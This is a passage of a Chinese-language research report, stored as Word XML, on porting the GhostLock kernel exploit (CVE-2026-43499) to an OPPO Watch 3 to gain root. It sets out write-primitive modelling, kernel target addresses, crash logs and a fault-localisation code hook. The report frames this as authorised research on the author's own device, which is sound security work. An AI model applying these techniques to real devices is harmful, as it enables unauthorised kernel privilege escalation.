          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>幽灵 waiter 基址 = `buf[4]`，即 `W_BASE = 4`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，与 §6.1 的静态帧深度预测完全一致（独立验证）。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同一次 fire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r6 = ghost = 0xc7e19ec0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；更早一次 fire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r6 = 0xc4b25ec0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。两者都满足 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>`ghost = stack_top − 320`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0xc7e19ec0 + 0x140 = 0xc7e1a000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0xc4b25ec0 + 0x140 = 0xc4b26000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）。即幽灵地址在跨 fire、跨重启的意义上是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>结构稳定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的（其绝对值随该线程栈而变，但相对关系固定）。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顺带否证：先前怀疑"对齐错误导致读到陈旧值"以及"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GHOSTLOCK_STACK_PAD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（用户态 alloca）可以移动内核 sys_clock_adjtime 帧"两条假说均不成立——后者对内核帧尺寸毫无影响，已从所有命令中移除。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7.4 这次实验同时封闭的两个问题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可达性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：走链在实机上确实执行到步骤 [5]（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_raw_spin_trylock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），说明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rt_mutex_adjust_pi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入口判定通过（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不等 → 不走 bail）。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新鲜度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：内核读取的就是我方最后一次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clock_adjtime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复制的内容，而不是残留栈垃圾。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后者尤其重要：早前一次 fire（oracle 目标）中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 = 0x00000002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，当时被解读为"写窗口错位"，实际是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>旧构建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的产物：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&lt;3&gt;[ 4265.019239] Alignment trap: not handling instruction e1902f9f at [&lt;c0faea40&gt;]</w:t>
        <w:br/>
        <w:t>&lt;1&gt;[ 4265.019254] Unhandled fault: alignment exception (0x001) at 0x00000002</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[ 4265.019337] PC is at _raw_spin_trylock+0x24/0x90</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[ 4265.019363] r7 : d99596b4  r6 : c4b25ec0  r5 : 00000002  r4 : d9959000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e1902f9f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即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ldrex r2, [r0]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_raw_spin_trylock+0x20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），对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做排除性访问产生对齐陷阱。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 = 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说明那一版走链读到的是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>未被植物覆盖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的字段；指纹实验证明现在的构建已无此问题。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8 走链的指令级建模与安全页设计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8.1 入口判定（`kernel/locking/rtmutex.c: rt_mutex_adjust_pi()`）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raw_spin_lock_irqsave(&amp;task-&gt;pi_lock);</w:t>
        <w:br/>
        <w:t>waiter = task-&gt;pi_blocked_on;</w:t>
        <w:br/>
        <w:t>if (!waiter || rt_mutex_waiter_equal(waiter, task_to_waiter(task))) { unlock; return; }</w:t>
        <w:br/>
        <w:t>next_lock = waiter-&gt;lock;</w:t>
        <w:br/>
        <w:t>raw_spin_unlock_irqrestore(&amp;task-&gt;pi_lock);</w:t>
        <w:br/>
        <w:t>get_task_struct(task);</w:t>
        <w:br/>
        <w:t>rt_mutex_adjust_prio_chain(task, RT_MUTEX_MIN_CHAINWALK, NULL, next_lock, NULL, task);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两个关键推论（在实机日志/寄存器中得到确认）：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet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orig_waiter == NULL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，因此走链内部的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task_has_pi_waiters()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task_top_pi_waiter()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检查被跳过；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet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植字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waiter-&gt;prio =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task_to_waiter(task)-&gt;prio = 120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不等，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rt_mutex_waiter_equal()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必然失败，走链</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>必然执行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（对应反汇编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c0196d14/c0196d18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比较后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bne c0196d64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，以及 Oops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r8 = 0x00000001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即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requeue = true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8.2 `rt_mutex_adjust_prio_chain`（`c0196c4c`，尺寸 0x558）关键基本块映射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地址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指令（实测反汇编）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语义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我方布局如何满足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c0196d14/18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r1,[r4,#0x34]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r0,[r6,#0x20]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task-&gt;prio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vs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waiter-&gt;prio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prio 植 0 ⇒ 不等 ⇒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bne c0196d64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c0196d64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mov r0, r5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r0 =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waiter-&gt;lock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植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（页内、4 字节对齐）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c0196d68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c0faea20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_raw_spin_trylock(waiter-&gt;lock)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的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字写 0 ⇒ 应获得锁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c0196d6c/70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r0,#0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bne c0196d94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成功 → 继续；失败 → 走 else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失败分支即死循环风险（§9.3）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c0196d74–c0196d90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c0faed30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(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_raw_spin_unlock_irq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)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c0faebd4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(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_raw_spin_lock_irq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)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r6,[r4,#0x6c8]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r6,#0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bne c0196cb4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重取 pi_lock、重读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pi_blocked_on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goto retry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若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pi_blocked_on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恒非 NULL 且 trylock 恒失败 ⇒ 形如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cpu_relax(); goto retry;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的无穷循环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c0196d94–c0196dac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r0,[sp,#8]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（orig_lock=NULL）/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sl,[sp,#0x34]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（top_task）/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r5,r0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ldrne r0,[r5,#0xc]; bicne #1; cmpne r0,sl; beq c019710c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owner 自锁检测（EDEADLK）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owner 植 0 ⇒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r5,r0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不等 ⇒ 读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[fake_lock,#0xc]=0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 != task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⇒ 不跳 EDEADLK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c0196db0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tst r8,#1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requeue 分支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r8=1 ⇒ 进入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c0196db8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r0,[r5,#8]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lock-&gt;waiters.rb_leftmost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（rb_root_cached 第二字）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=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fake_w0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c0196dc4 / dcc / dd0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r1,[r0,#0x1c]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r1,r5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beq c0196e78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top_waiter 的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必须等于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waiter-&gt;lock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fake_w0-&gt;lock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植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⇒ 相等 ⇒ 跳过厂商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udf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 c019718c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c0196e78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r1,[r6]; cmp r1,r6; beq c0196ea4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RB_EMPTY_NODE(&amp;waiter-&gt;tree_entry)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：若幽灵已自清则跳过 dequeue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植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tree_pc = W−4 ≠ ghost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⇒ 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不为空 ⇒ dequeue 执行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（写 where 的前提）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c0196e84–c0196e90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r0,r6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rb_next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str r0,[r5,#8]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仅当被摘节点是 leftmost 时重算 leftmost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top_waiter =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fake_w0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≠ 幽灵 ⇒ 跳过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c0196e94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c0f9af3c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rb_erase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唯一的"写 where"点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*(W)=V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然后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*(V)=W−4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tree_pc/r/l 决定 W、V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c0196ea0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str r6,[r6]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RB_CLEAR_NODE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（写自身，页内安全）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ghost+0 写 ghost+0，落在栈上，无害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c0196ea8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str task-&gt;prio → ghost+0x20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更新 waiter prio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页/栈内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c0196ec0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c0197ae8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rt_mutex_enqueue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把栈 waiter 重新插入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的树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见 §8.3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c0196ee4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ldr r0,[r5,#0xc]; cmp r0,#1; bls c0197144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[9]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owner ≤ 1 ⇒ 提前退出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owner 植 0 ⇒ 在 [9] 退出，绝不进入 [10]/[11]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c019715c–c019716c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cmp sl,r0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bl c0faed30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跳过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wake_up_process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、解锁并返回 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prerequeue == top_task ⇒ 不唤醒伪造 task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8.2.1 单次可控写的来源：`rb_erase` 的单子节点分支（推导）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walksafe 植字为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ghost.tree_pc = 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ghost.tree_r = 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ghost.tree_l =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root = &amp;fake_lock-&gt;waiters.rb_root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fake_lock+4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，其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rb_node = fake_w0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）。按 5.4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lib/rbtree.c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__rb_erase_augmented()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node-&gt;rb_left ==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child = node-&gt;rb_right = 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（走"单孩子"分支，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>不进入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两孩子的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tmp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分支）。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parent = rb_parent(node) = (W−4) &amp; ~3 = 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为 4 字节对齐，故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的低两位为 0，颜色位为 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>RED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__rb_change_child(node, child, parent, root)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if (parent-&gt;rb_left == node) parent-&gt;rb_left = child; else parent-&gt;rb_right = child;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其中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parent-&gt;rb_left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位于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(W−4)+8 = W+4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parent-&gt;rb_right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位于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(W−4)+4 = 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。只要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*(W+4) != ghost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（对所有真实内核对象恒成立），就走 else，于是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*(W) = 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** ← 这就是我们要的那一次写。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if (child) child-&gt;__rb_parent_color = node-&gt;pc;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⇒ **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 = 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**（第二写，落在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等自家页内地址，可接受）。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__rb_copy_color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与重平衡：被摘节点颜色为 RED ⇒ 返回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rebalance = NULL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⇒ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>不调用 `rb_erase_color`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，不会向祖先/祖父扩散任何读写。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因此"一次 punch = 一次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*(W)=V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一次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*(V)=W−4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一次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*(W+4)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读"，其余全部落在幽灵栈帧自身（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 r6,[r6]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 r0,[r6,#0x20]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）。这也解释了为什么 phase 0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必须选在自家页：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*(V)=W−4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会破坏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处的内容，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是我们自己的表，破坏它无副作用；反之若把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指向内核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.data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，就会造成第二处不可控写。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8.3 `rt_mutex_enqueue`（`c0197ae8`）与"强制走右"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走链把 requeue 出来的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>栈 waiter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（其 prio 刚被写成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，clamp punch 下为 120…139）插入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fake_lock-&gt;waiters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，比较式为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waiter-&gt;prio &lt; node-&gt;prio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c0197b1c cmp r5,r2 / movwlt r7,#1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）。把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fake_w0-&gt;prio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植为 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>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后，"任何值都小于 0"恒不成立 ⇒ 恒走 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>右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子，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rb_insert_color_cached(..., leftmost=false)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rb_leftmost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仍是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fake_w0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。这一步同时保证了：(a) 不会把栈 waiter 变成 top waiter；(b)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[9]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之后的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wake_up_process()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分支被绕开，伪造的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waiter-&gt;task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永不被解引用——在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CONFIG_CPU_SW_DOMAIN_PAN=y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下这点是硬要求，而把 task 植为页内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fake_task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则是第二重保险。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fake_w0-&gt;tree_entry.parent_color = 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（BLACK、parent NULL）使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__rb_insert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第一次循环即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break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，不触碰任何父/祖指针——这是参考实现中一处极易写错的位（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RB_RED=0 / RB_BLACK=1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），也是本研究早期一批失败的直接原因（任务 #9 的修复项）。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8.4 hijack 目标与两阶段写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真正的分派槽位是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struct miscdevice.fops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，因为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drivers/char/misc.c: misc_open()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执行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new_fops = fops_get(minor_data-&gt;fops); file-&gt;f_op = new_fops;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；改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自身的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owner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字段不影响任何分派。离线映射给出：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c1aa8808 d ashmem_misc         → offsetof(fops) = 8  → W = 0xc1aa8810</w:t>
        <w:br/>
        <w:t>c13ae0c8 d ashmem_fops</w:t>
        <w:br/>
        <w:t>c1a08a04 d sysctl_optmem_max   （oracle 槽位）</w:t>
        <w:br/>
        <w:t>c1a1d174 d console_printk      （备选 oracle 槽位）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target.h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内一处旧注释把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ashmem_misc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记作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c1aa8750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，与设备自抽取映射不符；以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System.map.fixed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与运行时日志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write_target=c1aa8810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为准。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SYSCTL_OPTMEM_MAX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同理：注释中的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c1a08934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陈旧，烘焙值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c1a08a04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与实机日志一致。）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phase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 = 目标槽位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 = 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。落地后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*(W) = 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rb_erase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的第二写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 = W − 4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处（页内，可接受）。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phase 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 = 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 =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fops-&gt;owner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归零，避免后续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fops_get/put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依赖 owner 模块引用计数）。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注意 phase 0 的第二写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 = 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恰好把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fake_fops-&gt;owner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写成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（一个伪模块指针），因此 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>phase 1 必须在任何 `open("/dev/ashmem")` 之前完成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，否则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misc_open()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里的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try_module_get(fops-&gt;owner)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会直接解引用野指针。顺序为：phase 0 → phase 1 → 读回验证 → 打开设备。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 =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时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rb_erase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if (child)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分支不执行，故 phase 1 只有一处写、天然干净。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验证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：oracle 模式下读回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/proc/sys/net/core/optmem_max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。SELinux 在本构建下拒绝 shell 访问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/proc/sys/kernel/*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/proc/sys/vm/*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（已实测 printk/panic/kptr_restrict 均 Permission denied），但</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>允许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/proc/sys/net/core/*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，故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是唯一既有正向读回、又因只影响 per-socket option memory 而归零也不会挂机的槽位。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日志（oracle fire，展示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确实为 optmem 地址、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为页内 fops 表）：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[15:56:47.940] WS a=1 ph=0 wbase=4 W=c1a08a04 V=da3a6a00 page=da3a6000</w:t>
        <w:br/>
        <w:t xml:space="preserve">              fops=da3a6a00 lock=da3a6700 plant=c1a08a00 da3a6a00 00000000 da3a6700 00000000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9 失败模式与观测方法学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9.1 "挂死"与"Oops"的判别法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本平台关闭了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LOCKUP_DETECTOR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SOFTLOCKUP_DETECTOR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HUNG_TASK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PSTORE_CONSOLE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，但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CONFIG_PSTORE=y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PSTORE_RAM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QCOM_WATCHDOG_BARK_TIME=15000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共同给出一个干净的二分法：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 xml:space="preserve">Oops（含 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="黑体"/>
                <w:b/>
                <w:i w:val="0"/>
                <w:strike w:val="0"/>
                <w:color w:val="8B1C1C"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>udf</w:t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/NULL/对齐/野指针）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静默挂死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ramoops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dmesg-ramoops-0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必然新增完整记录（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in_atomic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→ panic → 落盘）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内容逐字节不变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dumpsys dropbox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有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SYSTEM_LAST_KMSG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无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复位时刻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故障即刻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约 15 s 后（看门狗 bark）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pstore 权限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ls /sys/fs/pstore/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为 EACCES，但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cat dmesg-ramoops-0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可读（0444），grep 需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-a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同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实验证据（4 次 fire 的 pstore 文件 md5）：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572d092911179cae86b30e22e42513d8  wspat-post-pstore.txt   (r5=0x12c 的记录)</w:t>
        <w:br/>
        <w:t>572d092911179cae86b30e22e42513d8  wsself-pre-pstore.txt</w:t>
        <w:br/>
        <w:t>572d092911179cae86b30e22e42513d8  wsself-post-pstore.txt  ← 与 pre 相同 ⇒ wsself 未产生新 Oops</w:t>
        <w:br/>
        <w:t>572d092911179cae86b30e22e42513d8  wsor2-pre-pstore.txt</w:t>
        <w:br/>
        <w:t>572d092911179cae86b30e22e42513d8  wsor2-post-pstore.txt   ← 同上 ⇒ wsor2 也是挂死</w:t>
        <w:br/>
        <w:t>e1393046fc41ee0f61f58c52c163fe9c  wsora-post-pstore.txt   (r5=2 的对齐陷阱记录)</w:t>
        <w:br/>
        <w:t>e1393046fc41ee0f61f58c52c163fe9c  wspat-pre-pstore.txt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9.2 实验记录矩阵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实验标签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关键配置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观测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判读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f120gap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nocust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fillauto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（早期）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pselect 向量、prio 填充/区间探针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结果不可判读（当时尚无几何指纹）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促成 §7 指纹探针的设计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wsora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walksafe，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WS_TARGET=oracle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，旧构建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Oops：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_raw_spin_trylock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对齐陷阱，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r5=2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r6=c4b25ec0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植物未覆盖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waiter-&gt;lock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（旧构建新鲜度问题）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wspat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GHOSTLOCK_PATTERN=1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（指纹）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Oops：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NULL deref @0x12c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r5=0x12c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r6=c7e19ec0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`W_BASE=4` 实测成立；走链抵达 [5]；写窗口内容可控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wsor2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walksafe + oracle，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W_BASE=4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日志止于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PUNCH-TGT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，15 s 复位，pstore 不变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走链启动后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挂死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wsself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walksafe +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WS_TARGET=self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（两写都落自家页内）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同上，挂死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挂死与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写目标无关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⇒ 根因在走链机制内部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punchself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punchowner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ctl-esrch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punch 判别组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见 §9.3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排除 punch 目标因素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WS_TARGET=self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这一组尤其关键：它把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都指向自家受控页（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 = c4344e00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 = c4344e08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），即使写成功也只破坏我们自己的数据；实机表现仍是挂死。因此</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>"瞄准错误"被排除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，问题必然位于走链自身的执行流。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9.3 主假说：trylock 失败后的无穷重试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c0196d68 bl _raw_spin_trylock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失败时（返回 0），控制流走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c0196d74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_raw_spin_unlock_irq(&amp;task-&gt;pi_lock)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_raw_spin_lock_irq(&amp;task-&gt;pi_lock)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重取、重读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，若非 NULL 则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bne c0196cb4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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>直接 goto retry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。由于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在我方场景中始终非 NULL（幽灵正是靠它存在），且重试时 trylock 的目标仍是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fake_lock.wait_lock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，只要该字</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>非 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，这段循环就永不退出：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c0196d74  mov r0, r7              ; &amp;task-&gt;pi_lock  (= task + 0x6b4)</w:t>
        <w:br/>
        <w:t>c0196d78  bl 0xc0faed30           ; _raw_spin_unlock_irq(&amp;task-&gt;pi_lock)</w:t>
        <w:br/>
        <w:t>c0196d7c  mov r0, r7</w:t>
        <w:br/>
        <w:t>c0196d80  bl 0xc0faebd4           ; _raw_spin_lock_irq(&amp;task-&gt;pi_lock)</w:t>
        <w:br/>
        <w:t>c0196d84  ldr r6, [r4, #0x6c8]    ; waiter = task-&gt;pi_blocked_on —— 仍非 NULL</w:t>
        <w:br/>
        <w:t>c0196d8c  bne 0xc0196cb4          ; goto retry —— 无退避计数、无超时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在 8 核 SMP 上这会造成一次"占住一个 CPU 的死循环 + 反复抢占 pi_lock"的静默系统级卡顿：没有 softlockup 检测器去打印它，15 s 后 SoC 看门狗复位，pstore 里一行都不多。这与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wsself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wsor2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的全部观测（日志停在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PUNCH-TGT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、15 s 复位、pstore md5 不变）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>完全一致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而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fake_lock.wait_lock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为 0 是 §4.1 的页构建明确写入的（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put32(p, LOCK_OFF + 0x00, 0)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）。因此若假说成立，唯一自然解释是：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punch 时刻该页已经不是我们的页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——泄露对象所在 slab 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PREP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（t≈40.4 s）与 punch（t≈48.6 s）之间约 8 s 的间隔中被内核回收/复用（手表上系统服务活跃、内存压力波动），页上恰好是一个"已占用自旋锁 ≠ 0"的真实数据。这也与另一条独立记忆相符（order-3/页大小曾被误设，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实为 order-0）。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9.4 备择假说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H2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：trylock 成功，但厂商在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c0196dc4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之后（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udf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加固、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c019718c/94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）加入了主线 5.4 没有的检查，触发了一次不可打印的死锁式等待。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H3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：走链之后的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rt_mutex_setprio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路径进入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__task_rq_lock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，因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fake_task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的某些字段（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on_rq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sched_class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）被真实调度器读到而阻塞 rq 锁。当前 owner=0 应在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[9]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退出，理论上不触及；但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 r6,[r6]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（RB_CLEAR）与 prio 回写会破坏栈上 waiter，若走链被重试多次，可能形成不一致状态。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H4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：死循环发生在轮询线程自身（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clock_adjtime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快速返回，正常），已被"同一次 fire 中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PRE-ATDFI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PUNCH-TGT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三行全部打印"排除到 punch 之后。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10 下一步：毒字阶梯（poison ladder）单步故障定位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10.1 设计思想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既然挂死没有日志，就把"没有日志"变成可判定信号：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每次只把页内一个关键字写成非法/未对齐值，让走链在真正经过该字段时必然产生带 PC 的 Oops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。若某次 fire 变成干净的 Oops，则证明（a）页内容确实是我们在 punch 时刻写入的，（b）走链确实抵达了读取该字段的步骤；若仍然挂死，则该字段在此之前就未被读取，或页已被回收。这等价于一台"单步调试器"，每一步只消耗一次可控重启。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rung 1 : GHOSTLOCK_PAGE_POISON="700,1"   ; fake_lock.wait_lock := 1（未对齐）</w:t>
        <w:br/>
        <w:t xml:space="preserve">         → 若 Oops @ _raw_spin_trylock：页是我们的、植物是活的、走链抵达 [5]；</w:t>
        <w:br/>
        <w:t xml:space="preserve">           则此前所有挂死意味着 trylock 成功并且走链继续（问题在 [5] 之后 → rung 2/3）</w:t>
        <w:br/>
        <w:t xml:space="preserve">         → 若仍然挂死：页在 punch 时刻已不是我们的（H1 成立 → 改为"紧贴 PREP 立刻 punch"</w:t>
        <w:br/>
        <w:t xml:space="preserve">           或"punch 前重喷页"）</w:t>
        <w:br/>
        <w:t>rung 2 : GHOSTLOCK_PAGE_POISON="61c,3"   ; fake_w0.lock := 3（未对齐且非 fake_lock）</w:t>
        <w:br/>
        <w:t xml:space="preserve">         → Oops @ c0196dc4 的 ldr：证明走链过了 [5]、进入 top_waiter 校验</w:t>
        <w:br/>
        <w:t>rung 3 : 依次对 W0 的 pi_tree 字、fake_task-&gt;pi_waiters、task-&gt;stack 目标字做同样处理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实现只需在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exploit/src/util.c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的页构建循环末尾加一个钩子（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put_fake_fops_table()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之后、循环闭合之前）：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/* 每次 fire 只毒一个字：把 "偏移,值" 覆盖到每个喷出的页上。</w:t>
        <w:br/>
        <w:t xml:space="preserve"> * 目的是把"静默挂死"转成"带 PC 的 Oops"，从而给走链做单步定位。 */</w:t>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  const char *ps = getenv("GHOSTLOCK_PAGE_POISON");</w:t>
        <w:br/>
        <w:t xml:space="preserve">  if (ps &amp;&amp; *ps) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    unsigned long po = strtoul(ps, nullptr, 16), pv = 0;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    const char *cm = strchr(ps, ',');</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if (cm) pv = strtoul(cm + 1, nullptr, 16);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if (po &lt; ORDER3_SIZE) put32(p, (size_t)po, (uint32_t)pv);</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}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（截至本报告撰写，该钩子尚未编译进设备上的构建；构建产物为 419788 字节、md5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370ed5ea93d6e98b3a31f89b83a196f5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push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后设备侧 md5 校验一致。）</w:t>
      </w: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10.2 判读矩阵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rung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结论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1（毒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wait_lock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Oops @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_raw_spin_trylock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（PC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c0faea40/44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页内容可控、走链达 [5]；挂死原因在 [5] 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之后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仍挂死（pstore md5 不变）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页在 punch 时已失主 ⇒ 缩短 PREP→punch 间隔或 punch 前重喷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2（毒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fake_w0-&gt;lock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Oops @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c0196dc4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走链越过 [5]，进入 top_waiter 校验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仍挂死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挂死点位于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c0196d94..c0196dc4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之间（EDEADLK 判定/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udf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任意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optmem_max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读回 ==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fake_fops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单次可控写落地成功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（正向验证，非"没崩"推断）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Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="黑体"/>
          <w:color w:val="1F3B63"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>10.3 root 成功判据（不变）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设备不复位、日志走到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WS-DONE ... verdict=EXACT-HIT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；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cat /proc/sys/net/core/optmem_max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精确等于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地址（oracle 阶段）；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phase 1 归零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fops-&gt;owner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try_cfi_stage()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执行，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open("/dev/ashmem")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跳入我方表；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id -u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返回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，且全程未触碰 bootloader。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11 风险与替代路线评估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硬件风险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：当前所有失败都表现为重启；Bootloader 未被触碰，不存在变砖路径。每次失败 fire 的时间成本约 40 s（含 ADB 重连与 pstore 采集）。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稳定性代价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：走链死循环会短时占住 CPU 与 pi_lock，在手表上偶发伴随其他任务被拖慢；已确认无持久损坏（重启后系统正常、用户数据完好）。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被排除的路线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（记录以免重复劳动）：（a）无符号的运行时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pipe.c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mem_map 引导——被设备所有者明确否决；（b）任何依赖解锁 bootloader 的镜像刷写；（c）使用 A.90 等异版本 blob 的符号；（d）把用户态地址直接当作伪造内核指针（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CPU_SW_DOMAIN_PAN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阻断）。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet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备选提权面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（本研究之外的候选）：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udf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加固显示该 vendor 内核在 PI 路径上有主动断言，提示其调度/锁子系统可能还有别的检查点可用作信标；若单次写最终无法在走链内落地，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sched_setattr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uCLAMP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memfd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组合仍提供其他可写的内核对象窗口。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12 结论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本研究把 GhostLock（CVE-2026-43499）在 OPPO Watch 3 / OWW212 这一 ARM32 无 KASLR 内核上的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>可达性链条完整打通并逐环实证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：符号重建（三方一致）→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mm_struct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泄露（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HIT model=1 hsz=256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）→ 幽灵 waiter 形成（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REQUEUE-PI ret=-1 errno=35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）→ 写窗口命中与几何确定（指纹探针，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W_BASE=4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ghost = stack_top − 320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）→ 走链启动并抵达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trylock（两次独立 Oops 的 PC/LR 相同）→ 指令级走链建模与安全页设计（owner=0 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[9]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退出、prio=0 强制右行、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pc=1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阻断重平衡、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lock=fake_lock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绕开厂商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udf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尚未成功的部分是最后一公里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：当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被植为我方页内合法地址后，实机表现为 15 s 无日志硬复位而非预期的"干净返回 0 + 一次可控写"。该现象已被实验收窄为与写目标无关（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self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oracle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皆挂），主假说是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在 punch 时刻非 0（页回收）导致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cpu_relax(); goto retry;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死循环。§10 给出的毒字阶梯是一次即可判读该假说的最小实验，且失败成本仅为一次重启。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对设备所有者而言，可执行的结论是：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技术路线成立、边界安全（不动 bootloader）、根因已定位到单一可判定的二分点，下一步实验无需新工具链。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13 伦理与合规声明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本工作全部在作者自有、明确授权的单一台设备上完成，目的为评估厂商内核安全更新滞后的实际风险。所有探针均选择"最坏退化为一次重启"的构造；不使用、不外传任何用户数据；不绕过或修改设备锁、签名验证与 Bootloader 状态；相关漏洞信息以公开渠道已披露的 CVE 为边界。建议厂商侧修复方式为 backport 主线对应错误路径上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pi_blocked_on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的清理（在 requeue/EDEADLK 早退处对发起方与阻塞方同时清链），并在厂商加固中对该路径补充断言。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参考文献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Linux 内核主线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kernel/locking/rtmutex.c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kernel/futex/requeue.c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kernel/sched/core.c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（5.4.134 本地副本：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linux-5.4/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CVE-2026-43499（GhostLock）公开披露与 ARM64/4.14 参考 PoC 仓库；OPPO 平台移植仓库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ReBiliBin/ghostlock-oppo-watch3pro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（本报告以实机数据评估其结论）。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include/linux/rbtree_augmented.h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RB_RED=0 / RB_BLACK=1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lib/rbtree.c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__rb_insert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rb_erase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语义）。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drivers/char/misc.c:misc_open()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minor_data-&gt;fops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为真实分派槽位）。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Android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ashmem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driver（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drivers/staging/android/ashmem.c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KernelSnitch（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mm_struct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泄露 via hsearch 碰撞）技术描述。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Qualcomm SMD/SoC watchdog 驱动与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CONFIG_QCOM_WATCHDOG_BARK_TIME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行为。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="4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ColorOS OTA 接口（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iota.coloros.com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）固件获取记录（本地：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ota-research/OTA获取记录.md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附录 A：关键符号（设备自抽取 kallsyms，`System.map.fixed`）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符号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运行时地址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rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="黑体"/>
                <w:b/>
                <w:i w:val="0"/>
                <w:strike w:val="0"/>
                <w:color w:val="8B1C1C"/>
                <w:sz w:val="18"/>
              </w:rPr>
